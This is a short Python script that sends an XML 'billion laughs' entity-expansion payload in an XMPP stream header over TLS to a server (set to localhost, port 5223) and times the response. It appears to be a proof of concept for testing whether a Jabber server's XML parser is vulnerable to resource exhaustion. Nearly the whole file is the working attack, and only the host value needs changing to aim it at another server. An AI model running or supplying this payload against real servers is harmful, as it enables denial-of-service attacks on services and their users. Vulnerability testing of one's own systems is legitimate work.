import socket
import time

host = 'localhost'
port = 5223

payload = '''<?xml version='1.0'?><!DOCTYPE test [ <!ENTITY lol "lol"> <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"> <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"> <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"> <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"> <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"> <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"> <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"> <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"> <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"> ] ><stream:stream xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' version='1.0' to='&lol9;'>'''

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))

ssl_sock = socket.ssl(s)

print "Payload:\n" + payload + "\n"

print "Sending XML billion laughs payload:\n"

ssl_sock.write(payload)

start = time.time()
data = ssl_sock.read()
end=time.time()

print "\nOutput:\n"+data
print "\n\nTotal time taken: "+str(end-start)+" seconds"

# Note that you need to close the underlying socket, not the SSL object.
del ssl_sock
s.close()
